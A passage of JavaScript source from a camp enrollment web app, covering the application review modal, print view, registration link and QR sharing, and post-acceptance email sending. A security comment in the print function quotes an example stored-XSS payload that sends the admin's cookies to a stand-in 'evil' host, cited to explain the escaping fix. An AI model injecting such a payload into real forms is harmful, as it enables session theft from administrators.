    function isSafeImageDataUrl(s){return typeof s==='string'&&/^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);}

    b+=sec('Application');
    b+=row('Applied',e.appliedDate||'—');
    b+=row('Application ID',id);
    b+=row('Status',e.status);
    b+=row('Source',e.source);

    // Everything below mirrors the ACTUAL registration form the parent
    // filled out — same section order, same show/hide, same relabeled
    // field text — read live from the current form config. A section or
    // field the camp has turned off simply doesn't render here either,
    // since it wasn't part of what was asked. (Custom-question answers and
    // e-signature aren't real FC_SECTIONS entries; they're pinned right
    // before Signature, exactly like campistry_register.html pins them.)
    var fc=getFormConfig();
    function fFieldOn(fid){ var cfg=(fc.fields||{})[fid]; return cfg?cfg.enabled!==false:true; }
    function fLabel(fid,fallback){ var cfg=(fc.fields||{})[fid]; return (cfg&&cfg.label)||fallback; }
    function sectionOn(key){ var cfg=(fc.sections||{})[key]; if(cfg)return cfg.enabled!==false; var def=FC_SECTIONS.filter(function(s){return s.key===key})[0]; return def?def.default:true; }

    var customRendered=false;
    function renderCustomResponses(){
        if(customRendered)return;
        customRendered=true;
        if(!e.customAnswers||!Object.keys(e.customAnswers).length)return;
        b+=sec('Custom Responses');
        var labels=e.customQuestionLabels||[];
        Object.entries(e.customAnswers).forEach(function([key,val]){
            var idx=parseInt(key.replace('q',''));
            var label=labels[idx]||('Question '+(idx+1));
            var display=Array.isArray(val)?val.join(', '):val;
            b+=row(label,display);
        });
    }
    // Custom Sections — each rendered as its OWN labeled card (unlike the
    // flat Custom Responses above), since the whole point of a section is
    // staying grouped under its own heading for whoever reviews it.
    var customSecRendered=false;
    function renderCustomSectionResponses(){
        if(customSecRendered)return;
        customSecRendered=true;
        if(!e.customSectionAnswers||!e.customSectionAnswers.length)return;
        e.customSectionAnswers.forEach(function(secAns){
            if(!secAns||!secAns.answers||!Object.keys(secAns.answers).length)return;
            b+=sec(secAns.label||'Additional Section');
            var labels=secAns.fieldLabels||[];
            Object.entries(secAns.answers).forEach(function([key,val]){
                var idx=parseInt(key.replace('f',''));
                var label=labels[idx]||('Field '+(idx+1));
                var display=Array.isArray(val)?val.join(', '):val;
                b+=row(label,display);
            });
        });
    }

    var SECTION_RENDERERS={
        camper:function(){
            b+=sec('Camper');
            if(e.camperPhoto&&fFieldOn('photo')&&isSafeImageDataUrl(e.camperPhoto)){
                b+='<img src="'+e.camperPhoto+'" style="width:72px;height:72px;object-fit:cover;border-radius:10px;border:1px solid var(--s200);margin-bottom:8px">';
            }
            if(fFieldOn('first')||fFieldOn('last'))b+=row('Name',e.camperName);
            if(fFieldOn('dob'))b+=row(fLabel('dob','Date of Birth'),e.dob);
            if(fFieldOn('gender'))b+=row(fLabel('gender','Gender'),e.gender);
            if(fFieldOn('school'))b+=row(fLabel('school','School'),e.school);
            if(fFieldOn('schoolGrade'))b+=row(fLabel('schoolGrade','School Grade'),e.schoolGrade);
            if(fFieldOn('teacher'))b+=row(fLabel('teacher','Teacher'),e.teacher);
        },
        parent:function(){
            b+=sec('Parent / Guardian');
            if(fFieldOn('parentName'))b+=row(fLabel('parentName','Name'),(e.parentName||'')+(e.parentRelation?' ('+e.parentRelation+')':''));
            if(e.parentPhone&&fFieldOn('parentPhone'))b+=rowRaw(fLabel('parentPhone','Phone'),'<a href="tel:'+esc(e.parentPhone)+'" style="color:var(--me);font-weight:600">'+esc(e.parentPhone)+'</a>');
            if(e.parentEmail&&fFieldOn('parentEmail'))b+=rowRaw(fLabel('parentEmail','Email'),'<a href="mailto:'+esc(e.parentEmail)+'" style="color:var(--me)">'+esc(e.parentEmail)+'</a>');
            if(e.parent2Name&&fFieldOn('parent2Name'))b+=row(fLabel('parent2Name','Parent 2'),e.parent2Name+(e.parent2Relation?' ('+e.parent2Relation+')':''));
            if(e.parent2Phone&&fFieldOn('parent2Phone'))b+=rowRaw(fLabel('parent2Phone','Parent 2 Phone'),'<a href="tel:'+esc(e.parent2Phone)+'" style="color:var(--me);font-weight:600">'+esc(e.parent2Phone)+'</a>');
            if(e.parent2Email&&fFieldOn('parent2Email'))b+=rowRaw(fLabel('parent2Email','Parent 2 Email'),'<a href="mailto:'+esc(e.parent2Email)+'" style="color:var(--me)">'+esc(e.parent2Email)+'</a>');
        },
        address:function(){
            b+=sec('Address');
            if(fFieldOn('street'))b+=row(fLabel('street','Street'),e.street);
            if(fFieldOn('city'))b+=row(fLabel('city','City'),e.city);
            if(fFieldOn('state'))b+=row(fLabel('state','State'),e.state);
            if(fFieldOn('zip'))b+=row(fLabel('zip','ZIP'),e.zip);
            if(e.street){var fullAddr=[e.street,e.city,e.state,e.zip].filter(Boolean).join(', ');b+='<a href="https://maps.google.com/?q='+encodeURIComponent(fullAddr)+'" target="_blank" style="display:inline-block;font-size:.75rem;font-weight:600;color:var(--me);margin-top:3px;text-decoration:none">Open in Maps →</a>'}
        },
        emergency:function(){
            b+=sec('Emergency Contact');
            if(fFieldOn('emName'))b+=row(fLabel('emName','Name'),(e.emergencyName||'')+(e.emergencyRel?' ('+e.emergencyRel+')':''));
            if(e.emergencyPhone&&fFieldOn('emPhone'))b+=rowRaw(fLabel('emPhone','Phone'),'<a href="tel:'+esc(e.emergencyPhone)+'" style="color:var(--me);font-weight:600">'+esc(e.emergencyPhone)+'</a>');
        },
        medical:function(){
            b+=sec('Medical');
            if(e.allergies&&fFieldOn('allergies'))b+=rowRaw(fLabel('allergies','Allergies'),'<span style="color:var(--err);font-weight:600">'+esc(e.allergies)+'</span>');
            if(e.medications&&fFieldOn('medications'))b+=rowRaw(fLabel('medications','Medications'),'<span style="color:var(--err);font-weight:600">'+esc(e.medications)+'</span>');
            if(fFieldOn('dietary'))b+=row(fLabel('dietary','Dietary'),e.dietary);
            if(e.medicalNotes&&fFieldOn('medicalNotes'))b+=row(fLabel('medicalNotes','Notes'),e.medicalNotes);
            if(!e.allergies&&!e.medications&&!e.dietary&&!e.medicalNotes)b+='<div style="font-size:.82rem;color:var(--ok);padding:2px 0">✓ No medical flags reported</div>';
        },
        preferences:function(){
            b+=sec('Preferences');
            if(fFieldOn('bunkmate'))b+=row(fLabel('bunkmate','Bunkmate Request'),e.bunkmate);
            if(fFieldOn('separate'))b+=row(fLabel('separate','Separation Request'),e.separateFrom);
            if(fFieldOn('shirt'))b+=row(fLabel('shirt','T-Shirt Size'),e.tshirtSize);
            if(fFieldOn('notes'))b+=row(fLabel('notes','Additional Notes'),e.notes);
        },
        documents:function(){
            if(!e.documents||!e.documents.length)return;
            b+=sec('Uploaded Documents');
            e.documents.forEach(function(doc){
                var sz=doc.size<1024?doc.size+'B':doc.size<1048576?Math.round(doc.size/1024)+'KB':Math.round(doc.size/1048576*10)/10+'MB';
                b+='<div style="display:flex;align-items:center;gap:6px;padding:4px 0;font-size:.8rem"><span>📄</span><strong style="color:var(--s700)">'+esc(doc.name)+'</strong><span style="color:var(--s400);font-size:.72rem">'+sz+'</span>';
                if(doc.data)b+=' <a href="'+esc(doc.data)+'" download="'+esc(doc.name)+'" style="color:var(--me);font-size:.72rem;font-weight:600">Download</a>';
                b+='</div>';
            });
        },
        payment:function(){
            b+=sec('Payment');
            b+=row('Session',e.session);
            b+=row('Tuition',e.sessionTuition?fm(e.sessionTuition):'—');
            b+=row('Payment Method',e.paymentMethod?_payLabel(e.paymentMethod):'Not selected');
            b+=row('Payment Status',e.paymentStatus||'pending');
            if(e.discount&&e.discount.active!==false&&e.discount.code)b+=row('Discount',(e.discount.label||'')+' ('+e.discount.code+')');
        },
        siblings:function(){
            if(!e.siblingGroup)return;
            var sibApps=Object.entries(enrollments).filter(function([,x]){return x.siblingGroup===e.siblingGroup||x.siblingGroup===id});
            if(sibApps.length<=1)return;
            b+=sec('Sibling Group');
            sibApps.forEach(function([sid,s]){
                if(sid!==id)b+=row('Sibling',s.camperName+' — '+s.status);
            });
        },
        signature:function(){
            renderCustomResponses(); // pinned right before Signature, same as the public form
            renderCustomSectionResponses();
            if(e.signature&&isSafeImageDataUrl(e.signature)){
                b+=sec('Signature');
                b+='<img src="'+e.signature+'" style="max-width:300px;height:80px;border:1px solid var(--s200);border-radius:var(--r);object-fit:contain;background:#fff">';
            }
        }
    };
    var order=(fc.sectionOrder&&fc.sectionOrder.length)?fc.sectionOrder.slice():FC_SECTIONS.map(function(s){return s.key});
    FC_SECTIONS.forEach(function(s){ if(order.indexOf(s.key)<0)order.push(s.key); });
    order.forEach(function(key){
        if(!sectionOn(key))return;
        var fn=SECTION_RENDERERS[key];
        if(fn)fn();
    });
    renderCustomResponses(); // fallback: still show answers even if Signature is off
    renderCustomSectionResponses();

    // Post-acceptance form responses — bunkmate/session/logistics choices
    // the parent submitted after acceptance, distinct from the application
    // fields above. Only shows once something's actually come back.
    if(e.postAccept){
        b+=sec('Post-Acceptance Responses');
        b+=row('Submitted',e.postAccept.submittedDate?new Date(e.postAccept.submittedDate).toLocaleString():'—');
        b+=row('Bunkmate Request'+((e.postAccept.bunkmate||[]).length>1?'s':''),Array.isArray(e.postAccept.bunkmate)?e.postAccept.bunkmate.join(', '):e.postAccept.bunkmate);
        b+=row('Do-Not-Bunk Request'+((e.postAccept.separate||[]).length>1?'s':''),Array.isArray(e.postAccept.separate)?e.postAccept.separate.join(', '):e.postAccept.separate);
        b+=row('Session Confirmation',e.postAccept.sessionConfirm);
        b+=row('T-Shirt Size',e.postAccept.shirt);
        b+=row('Transportation',e.postAccept.transportation);
        b+=row('Photo/Media Permission',e.postAccept.photoConsent?'Yes':(e.postAccept.photoConsent===false?'No':''));
        if(e.postAccept.customAnswers&&Object.keys(e.postAccept.customAnswers).length){
            var pafLabels=e.postAccept.customQuestionLabels||[];
            Object.entries(e.postAccept.customAnswers).forEach(function([key,val]){
                var idx=parseInt(key.replace('q',''));
                var label=pafLabels[idx]||('Question '+(idx+1));
                var display=Array.isArray(val)?val.join(', '):val;
                b+=row(label,display);
            });
        }
        // Custom Sections answered on the Post-Acceptance form — stays in
        // this same card (unlike the registration-side sections above,
        // which each get their own card) since Post-Acceptance Responses
        // is already rendered flat, not per-FC_SECTIONS-card.
        (e.postAccept.customSectionAnswers||[]).forEach(function(secAns){
            if(!secAns||!secAns.answers||!Object.keys(secAns.answers).length)return;
            b+=rowRaw(secAns.label||'Additional Section','<strong>&nbsp;</strong>');
            var pafSecLabels=secAns.fieldLabels||[];
            Object.entries(secAns.answers).forEach(function([key,val]){
                var idx=parseInt(key.replace('f',''));
                var label=pafSecLabels[idx]||('Field '+(idx+1));
                var display=Array.isArray(val)?val.join(', '):val;
                b+=row(label,display);
            });
        });
    }

    // Admin Notes
    b+=sec('Internal Notes');
    b+='<textarea id="avNotes" style="width:100%;padding:8px 10px;border:1.5px solid var(--s200);border-radius:var(--r);font-size:.82rem;font-family:var(--font);min-height:60px;resize:vertical;outline:none" placeholder="Add internal notes (only visible to admin)...">'+(e.adminNotes?esc(e.adminNotes):'')+'</textarea>';
    b+='<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.saveAppNote(\''+esc(id)+'\')">Save Notes</button>';
    if(_secOpen)b+='</div>';

    document.getElementById('avBody').innerHTML=b;

    // Footer buttons
    var f='<button class="me-btn me-btn--sec" onclick="CampistryMe.printApplication(\''+esc(id)+'\')" style="margin-right:auto">🖨 Print</button>';
    if(e.status==='applied'){
        f+='<button class="me-btn me-btn--pri" onclick="CampistryMe.updateEnrollStatus(\''+esc(id)+'\',\'accepted\');CampistryMe.closeModal(\'appViewModal\')">Accept</button>';
        f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.updateEnrollStatus(\''+esc(id)+'\',\'waitlisted\');CampistryMe.closeModal(\'appViewModal\')">Waitlist</button>';
        f+='<button class="me-btn me-btn--danger" onclick="CampistryMe.updateEnrollStatus(\''+esc(id)+'\',\'declined\');CampistryMe.closeModal(\'appViewModal\')">Decline</button>';
    }else if(e.status==='accepted'){
        f+='<button class="me-btn me-btn--pri" onclick="CampistryMe.enrollCamper(\''+esc(id)+'\');CampistryMe.closeModal(\'appViewModal\')">'+ico('enroll')+'Enroll Now</button>';
        f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.generateParentInvite(\''+esc(id)+'\')">'+ico('invite')+'Get Invite Link</button>';
        f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.openSendPostAcceptModal(\''+esc(id)+'\')" title="Bunkmate requests and other post-acceptance choices">'+(e.postAccept?'✓ ':'')+'Post-Acceptance Form</button>';
        f+='<button class="me-btn me-btn--danger" onclick="CampistryMe.updateEnrollStatus(\''+esc(id)+'\',\'declined\');CampistryMe.closeModal(\'appViewModal\')">Decline</button>';
    }else if(e.status==='waitlisted'){
        f+='<button class="me-btn me-btn--pri" onclick="CampistryMe.updateEnrollStatus(\''+esc(id)+'\',\'accepted\');CampistryMe.closeModal(\'appViewModal\')">Accept</button>';
        f+='<button class="me-btn me-btn--danger" onclick="CampistryMe.updateEnrollStatus(\''+esc(id)+'\',\'declined\');CampistryMe.closeModal(\'appViewModal\')">Decline</button>';
    }else if(e.status==='enrolled'){
        f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.generateParentInvite(\''+esc(id)+'\')">'+ico('invite')+'Get Invite Link</button>';
        f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.openSendPostAcceptModal(\''+esc(id)+'\')" title="Bunkmate requests and other post-acceptance choices">'+(e.postAccept?'✓ ':'')+'Post-Acceptance Form</button>';
        f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.updateEnrollStatus(\''+esc(id)+'\',\'withdrawn\');CampistryMe.closeModal(\'appViewModal\')">Withdraw</button>';
    }
    f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.closeModal(\'appViewModal\')">Close</button>';
    document.getElementById('avFooter').innerHTML=f;

    openModal('appViewModal');
}

function saveAppNote(id){
    var note=(document.getElementById('avNotes')?.value||'').trim();
    if(enrollments[id]){enrollments[id].adminNotes=note;save();toast('Notes saved')}
}

function printApplication(id){
    var e=enrollments[id];if(!e)return;
    var w=window.open('','_blank','width=800,height=900');

    // Stored-XSS hardening: every enrollment field originates from the
    // unauthenticated public registration form. Earlier this helper
    // interpolated raw values directly into HTML — an attacker submitting
    // `e.medicalNotes = "<img src=x onerror=fetch('//evil/?'+document.cookie)>"`
    // would execute in the admin's print window, with full session.
    // Now: row() escapes by default; rowRaw() exists for pre-built HTML;
    // signature is validated against a strict data-URL allow-list.

    function sec(t){return'<h2>'+esc(t)+'</h2><table>'}
    function row(l,v){return v?'<tr><td>'+esc(l)+'</td><td>'+esc(v)+'</td></tr>':''}
    function rowRaw(l,html){return html?'<tr><td>'+esc(l)+'</td><td>'+html+'</td></tr>':''}
    function end(){return'</table>'}

    function isSafeImageDataUrl(s){
        // Data URLs only; PNG / JPEG / GIF / WebP / SVG-data variants we can't
        // distinguish are excluded. SVG can carry script — never accept it.
        return typeof s === 'string' &&
               /^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);
    }

    var h='<html><head><title>'+esc('Application — '+e.camperName)+'</title><style>body{font-family:Arial,sans-serif;padding:30px;font-size:13px;color:#1E293B}h1{font-size:18px;margin:0 0 4px}h2{font-size:13px;color:#D97706;text-transform:uppercase;margin:16px 0 6px;border-bottom:1px solid #E2E8F0;padding-bottom:3px}table{width:100%;border-collapse:collapse}td{padding:3px 0;vertical-align:top}td:first-child{width:120px;color:#64748B;font-weight:600}.med{color:#EF4444;font-weight:600}.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700}img{max-width:250px;height:70px;object-fit:contain;border:1px solid #E2E8F0;border-radius:4px}@media print{body{padding:15px}}</style></head><body>';
    if(e.camperPhoto&&isSafeImageDataUrl(e.camperPhoto))h+='<img src="'+e.camperPhoto+'" style="float:right;width:90px;height:90px;object-fit:cover;max-width:90px">';
    h+='<h1>'+esc(e.camperName)+'</h1>';
    h+='<div style="color:#64748B;font-size:12px;margin-bottom:12px">Application ID: '+esc(id)+' · Status: '+esc(e.status)+' · Applied: '+esc(e.appliedDate)+'</div>';

    h+=sec('Camper');
    h+=row('Name',e.camperName);h+=row('DOB',e.dob);h+=row('Gender',e.gender);
    h+=row('School',e.school);h+=row('Grade',e.schoolGrade);h+=row('Teacher',e.teacher);h+=end();

    h+=sec('Parent/Guardian');
    h+=row('Name',(e.parentName||'')+(e.parentRelation?' ('+e.parentRelation+')':''));
    h+=row('Phone',e.parentPhone);h+=row('Email',e.parentEmail);
    if(e.parent2Name)h+=row('Parent 2',e.parent2Name+(e.parent2Relation?' ('+e.parent2Relation+')':''));
    if(e.parent2Phone)h+=row('Parent 2 Phone',e.parent2Phone);
    if(e.parent2Email)h+=row('Parent 2 Email',e.parent2Email);
    h+=end();

    h+=sec('Address');
    h+=row('Street',e.street);h+=row('City',e.city);h+=row('State',e.state);h+=row('ZIP',e.zip);h+=end();

    h+=sec('Emergency Contact');
    h+=row('Name',(e.emergencyName||'')+(e.emergencyRel?' ('+e.emergencyRel+')':''));h+=row('Phone',e.emergencyPhone);h+=end();

    h+=sec('Medical');
    h+=rowRaw('Allergies',e.allergies?'<span class="med">'+esc(e.allergies)+'</span>':esc('None'));
    h+=rowRaw('Medications',e.medications?'<span class="med">'+esc(e.medications)+'</span>':esc('None'));
    h+=row('Dietary',e.dietary||'None');h+=row('Notes',e.medicalNotes);h+=end();

    h+=sec('Preferences');
    h+=row('Bunkmate',e.bunkmate);h+=row('Separation',e.separateFrom);h+=row('T-Shirt',e.tshirtSize);h+=row('Notes',e.notes);h+=end();

    h+=sec('Payment');
    h+=row('Session',e.session);h+=row('Tuition',e.sessionTuition?'$'+Number(e.sessionTuition).toLocaleString():'—');
    h+=row('Method',_payLabel(e.paymentMethod));h+=row('Status',e.paymentStatus);
    if(e.discount&&e.discount.code)h+=row('Discount',e.discount.label);h+=end();

    if(e.customAnswers&&Object.keys(e.customAnswers).length){
        h+=sec('Custom Responses');
        var labels=e.customQuestionLabels||[];
        Object.entries(e.customAnswers).forEach(function([key,val]){
            var idx=parseInt(key.replace('q',''));var label=labels[idx]||('Question '+(idx+1));
            h+=row(label,Array.isArray(val)?val.join(', '):val);
        });h+=end();
    }

    (e.customSectionAnswers||[]).forEach(function(secAns){
        h+=sec(secAns.label||'Additional Section');
        var fieldLabels=secAns.fieldLabels||[];
        Object.entries(secAns.answers||{}).forEach(function([key,val]){
            var idx=parseInt(key.replace('f',''));var label=fieldLabels[idx]||('Field '+(idx+1));
            h+=row(label,Array.isArray(val)?val.join(', '):val);
        });h+=end();
    });

    if(e.postAccept&&e.postAccept.customSectionAnswers&&e.postAccept.customSectionAnswers.length){
        h+=sec('Post-Acceptance — Additional Sections');
        e.postAccept.customSectionAnswers.forEach(function(secAns){
            h+=rowRaw(secAns.label||'Additional Section','<strong>&nbsp;</strong>');
            var fieldLabels=secAns.fieldLabels||[];
            Object.entries(secAns.answers||{}).forEach(function([key,val]){
                var idx=parseInt(key.replace('f',''));var label=fieldLabels[idx]||('Field '+(idx+1));
                h+=row(label,Array.isArray(val)?val.join(', '):val);
            });
        });h+=end();
    }

    if(e.documents&&e.documents.length){
        h+=sec('Documents');
        e.documents.forEach(function(d){h+='<div style="padding:2px 0">📄 '+esc(d.name)+'</div>'});
    }

    if(e.signature){
        h+=sec('Signature');
        if(isSafeImageDataUrl(e.signature)){
            h+='<img src="'+e.signature+'">';
        }else{
            h+='<div style="color:#94A3B8;font-size:11px">[Signature omitted — invalid image format]</div>';
        }
    }

    if(e.adminNotes){h+=sec('Admin Notes');h+='<p>'+esc(e.adminNotes)+'</p>';}

    h+='<div style="margin-top:30px;font-size:11px;color:#94A3B8;border-top:1px solid #E2E8F0;padding-top:10px">Printed from Campistry Me · '+esc(new Date().toLocaleString())+'</div>';
    h+='</body></html>';
    w.document.write(h);w.document.close();
    setTimeout(function(){w.print()},300);
}

function copyRegLink(){
    var url=window.location.origin+'/campistry_register.html?camp='+encodeURIComponent(getCampId());
    if(navigator.clipboard){
        navigator.clipboard.writeText(url).then(function(){toast('Registration link copied!')});
    }else{
        prompt('Copy this link and share with parents:',url);
    }
}

// ═══════════════════════════════════════════════════════════════
// SEND LINK (email) + QR CODE — shared by the parent registration link
// and the staff application link.
// ═══════════════════════════════════════════════════════════════
function copyLinkText(url){
    if(navigator.clipboard){ navigator.clipboard.writeText(url).then(function(){toast('Link copied!')}); }
    else{ prompt('Copy this link:',url); }
}

// Loads the qrcode-generator library on demand (same CDN + API already used
// by campistry_live.js for printed template QR codes) — not loaded eagerly
// on every Me page view since only a QR click needs it.
var _qrLibPromise=null;
function _ensureQrLib(){
    if(window.qrcode)return Promise.resolve();
    if(_qrLibPromise)return _qrLibPromise;
    _qrLibPromise=new Promise(function(resolve,reject){
        var s=document.createElement('script');
        s.src='https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js';
        s.onload=function(){resolve();};
        s.onerror=function(){reject(new Error('QR library failed to load'));};
        document.head.appendChild(s);
    });
    return _qrLibPromise;
}
function showLinkQR(url,title){
    document.getElementById('qrTitle').textContent=title||'QR Code';
    document.getElementById('qrBody').innerHTML='<div style="padding:30px;color:var(--s400);font-size:.85rem">Loading…</div>';
    openModal('qrModal');
    _ensureQrLib().then(function(){
        try{
            var qr=window.qrcode(0,'M');
            qr.addData(url);
            qr.make();
            var svg=qr.createSvgTag(6,0);
            document.getElementById('qrBody').innerHTML='<div style="display:inline-block;padding:16px;background:#fff;border-radius:8px;border:1px solid var(--s200)">'+svg+'</div>'
                +'<div style="margin-top:10px;font-size:.75rem;color:var(--s500);word-break:break-all">'+esc(url)+'</div>'
                +'<div style="margin-top:10px"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.copyLinkText(\''+je(url)+'\')">Copy Link</button></div>';
        }catch(e){
            document.getElementById('qrBody').innerHTML='<div style="color:var(--err);font-size:.85rem">Could not generate QR code.</div>';
        }
    }).catch(function(){
        document.getElementById('qrBody').innerHTML='<div style="color:var(--err);font-size:.85rem">Could not load the QR library — check your connection.</div>';
    });
}
function showRegistrationQR(){ showLinkQR(window.location.origin+'/campistry_register.html?camp='+encodeURIComponent(getCampId()),'Registration Link QR Code'); }
function showStaffQR(){ showLinkQR(window.location.origin+'/campistry_staff_apply.html?camp='+encodeURIComponent(getCampId()),'Staff Application Link QR Code'); }

// Opens the "Send Link" modal for either the parent registration link
// (kind='registration', with an audience picker sourced from families/
// divisions) or the staff application link (kind='staff', which has no
// existing recipient list to draw from — always a manual email list).
function openSendLinkModal(kind){
    var isStaff=(kind==='staff');
    var url=window.location.origin+'/'+(isStaff?'campistry_staff_apply.html':'campistry_register.html')+'?camp='+encodeURIComponent(getCampId());
    document.getElementById('slTitle').textContent=isStaff?'Send Staff Application Link':'Send Registration Link';
    var h='';
    if(!isStaff){
        h+='<div class="fg"><label class="fl">Send to</label><select class="fs" id="slAudience" onchange="document.getElementById(\'slCustomWrap\').style.display=(this.value===\'custom\')?\'block\':\'none\'">';
        h+='<option value="all">All Families</option>';
        Object.keys(structure).sort().forEach(function(d){h+='<option value="'+esc(d)+'">'+esc(d)+' Only</option>';});
        h+='<option value="custom">Custom Email List</option>';
        h+='</select></div>';
    }
    h+='<div class="fg" id="slCustomWrap" style="'+(isStaff?'':'display:none')+'"><label class="fl">Email addresses (comma or newline separated)</label><textarea class="fi" id="slEmails" style="min-height:70px;resize:vertical" placeholder="parent1@example.com, parent2@example.com"></textarea></div>';
    h+='<div class="fg"><label class="fl">Subject</label><input class="fi" id="slSubject" value="'+esc(isStaff?'Join our team — Staff Application':'Camp Registration is Open')+'"></div>';
    h+='<div class="fg"><label class="fl">Message</label><textarea class="fi" id="slBodyText" style="min-height:110px;resize:vertical">'+esc((isStaff?"We're hiring for the upcoming season! Apply here:\n\n":'Registration is now open! Apply here:\n\n')+url)+'</textarea></div>';
    document.getElementById('slBody').innerHTML=h;
    var btn=document.getElementById('slSendBtn');
    if(btn){ btn.disabled=false; btn.textContent='Send'; btn.onclick=function(){ _sendLinkNow(isStaff); }; }
    openModal('sendLinkModal');
}
function openSendRegLinkModal(){ openSendLinkModal('registration'); }
function openSendStaffLinkModal(){ openSendLinkModal('staff'); }

async function _sendLinkNow(isStaff){
    var recipients=[];
    var audience=isStaff?'custom':(document.getElementById('slAudience')?.value||'all');
    if(audience==='custom'){
        var raw=(document.getElementById('slEmails')?.value||'');
        raw.split(/[,\n]/).map(function(s){return s.trim();}).filter(Boolean).forEach(function(email){recipients.push({email:email,name:''});});
    }else{
        Object.values(families).forEach(function(f){(f.households||[]).forEach(function(hh){(hh.parents||[]).forEach(function(p){if(p.email)recipients.push({email:p.email,name:p.name||''});});});});
        var seen={};recipients=recipients.filter(function(r){var k=r.email.toLowerCase();if(seen[k])return false;seen[k]=true;return true;});
        if(audience!=='all'){
            var divCampers={};Object.entries(roster).forEach(function(entry){if(entry[1].division===audience)divCampers[entry[0]]=1;});
            var divEmails={};Object.values(families).forEach(function(f){if((f.camperIds||[]).some(function(n){return divCampers[n];}))(f.households||[]).forEach(function(hh){(hh.parents||[]).forEach(function(p){if(p.email)divEmails[p.email.toLowerCase()]=1;});});});
            recipients=recipients.filter(function(r){return divEmails[r.email.toLowerCase()];});
        }
    }
    if(!recipients.length){toast('No recipients with an email address','error');return;}
    var subject=(document.getElementById('slSubject')?.value||'').trim();
    var body=(document.getElementById('slBodyText')?.value||'').trim();
    if(!body){toast('Enter a message','error');return;}
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.campName||ss.camp_name||'Camp';}catch(e){}
    var btn=document.getElementById('slSendBtn');
    if(btn){btn.disabled=true;btn.textContent='Sending…';}
    try{
        await callEdgeFunctionAuthed('send-broadcast',{campId:getCampId(),to:recipients,subject:subject,body:body,method:'email',campName:campName});
        toast('Sent to '+recipients.length+' recipient'+(recipients.length!==1?'s':''));
        closeModal('sendLinkModal');
    }catch(err){
        toast('Send failed: '+(err&&err.message||'unknown error'),'error');
    }finally{
        if(btn){btn.disabled=false;btn.textContent='Send';}
    }
}

// ── POST-ACCEPTANCE FORM: SENDING ────────────────────────────────────────
// One link per enrollment (not a shared camp-wide link like registration/
// staff) — the public page reads ?id=<enrollmentId> to know which camper's
// record to write choices back into. Reuses the same #sendLinkModal shell
// as the registration/staff "Send Link" flow, just pre-filled for one
// recipient instead of an audience picker.
function _postAcceptUrl(id){
    return window.location.origin+'/campistry_postaccept.html?id='+encodeURIComponent(id)+'&camp='+encodeURIComponent(getCampId());
}
function openSendPostAcceptModal(id){
    var e=enrollments[id]; if(!e){toast('Application not found','error');return;}
    if(!e.parentEmail){toast('No parent email on file for this applicant','error');return;}
    var url=_postAcceptUrl(id);
    document.getElementById('slTitle').textContent='Send Post-Acceptance Form';
    var h='<div class="fg"><label class="fl">To</label><input class="fi" value="'+esc(e.parentEmail)+'" disabled></div>';
    h+='<div class="fg"><label class="fl">Subject</label><input class="fi" id="slSubject" value="'+esc('A few more choices for '+(e.camperName||'your camper'))+'"></div>';
    h+='<div class="fg"><label class="fl">Message</label><textarea class="fi" id="slBodyText" style="min-height:110px;resize:vertical">'+esc('Congratulations — '+(e.camperName||'your camper')+' is accepted! Please complete a few more choices here:\n\n'+url)+'</textarea></div>';
    document.getElementById('slBody').innerHTML=h;
    var btn=document.getElementById('slSendBtn');
    if(btn){ btn.disabled=false; btn.textContent='Send'; btn.onclick=function(){ _sendPostAcceptNow(id); }; }
    openModal('sendLinkModal');
}
async function _sendPostAcceptNow(id){
    var e=enrollments[id]; if(!e)return;
    var subject=(document.getElementById('slSubject')?.value||'').trim();
    var body=(document.getElementById('slBodyText')?.value||'').trim();
    if(!body){toast('Enter a message','error');return;}
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.campName||ss.camp_name||'Camp';}catch(ex){}
    var btn=document.getElementById('slSendBtn');
    if(btn){btn.disabled=true;btn.textContent='Sending…';}
    try{
        await callEdgeFunctionAuthed('send-broadcast',{campId:getCampId(),to:[{email:e.parentEmail,name:e.parentName||''}],subject:subject,body:body,method:'email',campName:campName});
        e.postAcceptSentDate=new Date().toISOString();
        save();
        toast('Post-acceptance form sent to '+e.parentEmail);
        closeModal('sendLinkModal');
    }catch(err){
        toast('Send failed: '+(err&&err.message||'unknown error'),'error');
    }finally{
        if(btn){btn.disabled=false;btn.textContent='Send';}
    }
}
// Fires only when the camp turned "Send automatically on acceptance" on in
// the Post-Acceptance Form builder — silent (toast only), no confirm modal,
// since the office already opted into hands-off sending.
async function _autoSendPostAccept(id){
    var e=enrollments[id]; if(!e||!e.parentEmail)return;
    var url=_postAcceptUrl(id);
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.campName||ss.camp_name||'Camp';}catch(ex){}
    var subject='A few more choices for '+(e.camperName||'your camper');
    var body='Congratulations — '+(e.camperName||'your camper')+' is accepted! Please complete a few more choices here:\n\n'+url;
    try{
        await callEdgeFunctionAuthed('send-broadcast',{campId:getCampId(),to:[{email:e.parentEmail,name:e.parentName||''}],subject:subject,body:body,method:'email',campName:campName});
        e.postAcceptSentDate=new Date().toISOString();
        save();
        toast('Post-acceptance form auto-sent to '+e.parentEmail);
    }catch(err){
        toast('Auto-send of post-acceptance form failed: '+(err&&err.message||'unknown error'),'error');
    }
}

// ── POST-HIRE FORM: SENDING ──────────────────────────────────────────────
// One link per application (not a shared camp-wide link like the Staff
// Application itself) — the public page reads ?id=<applicationId> to know
// which hire's record to write onboarding answers back into. Mirrors the
// Post-Acceptance Form sending functions above exactly, one tier over on
// the hiring side.
function _postHireUrl(id){
